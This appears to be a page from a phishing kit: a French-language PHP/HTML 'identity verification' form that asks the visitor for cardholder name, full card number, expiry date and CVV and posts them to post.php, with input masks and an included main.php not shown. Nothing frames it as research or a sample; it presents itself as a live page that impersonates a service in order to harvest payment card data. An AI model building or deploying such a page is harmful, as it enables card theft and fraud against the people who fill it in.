<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/card.css">
    <title>Vérification d'identité </title>
</head>
<body>
   
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>


<main>
   
    <div class="continer">

    <div class="tittle">
<h3>Vérification d'identité.</h3>
<p>Veuillez saisir les informations de votre carte pour vérifier votre identité.</p>
</div>

       



<form action="post.php" method="post">

<div class="col">
    <label> Nom du titulaire de la carte </label>
 <input type="text" name="name" required> </div>


<div class="col">
<label> Numéro de carte </label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="col">
<label> Date d'expiration </label> 
<input type="text" name="exp" placeholder="MM/AA" id="exp" required> </div>


<div class="col">
<label>Code de sécurité </label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>





<div class="but">
<div class="button"><button type="submit"> Continuer</button> </div>
</div>

</form>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 

</body>
</html>